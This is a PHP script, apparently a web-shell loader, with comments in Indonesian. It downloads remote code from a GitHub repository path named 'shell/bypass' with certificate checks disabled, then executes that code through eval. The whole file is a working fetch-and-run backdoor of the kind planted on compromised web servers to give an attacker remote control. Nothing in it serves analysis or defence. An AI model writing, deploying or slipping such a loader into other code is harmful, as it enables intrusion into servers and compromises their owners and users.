<?php

function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $result = curl_exec($ch);

    if ($result === false) {
        http_response_code(404);
        die("CURL ERROR: " . curl_error($ch));
    }

    curl_close($ch);
    return $result;
}

$url = "https://raw.githubusercontent.com/rexorid/shell/refs/heads/main/bypass/isiwp.txt";
$encoded_code = get_contents($url);

// Jika kosong, langsung error biar ga blank
if (trim($encoded_code) === "") {
    http_response_code(500);
    die("ERROR: File dari URL kosong / tidak terbaca");
}

// Debug manual (optional)
// echo "<pre>"; print_r($encoded_code); echo "</pre>"; exit;

// Tangkap error eval biar tidak blank
try {
    eval("?>".$encoded_code."<?php ");
} catch (Throwable $e) {
    // Menampilkan error jika eval gagal
    echo "<pre>Eval Error: " . $e->getMessage() . "</pre>";
    http_response_code(500);
}
?>
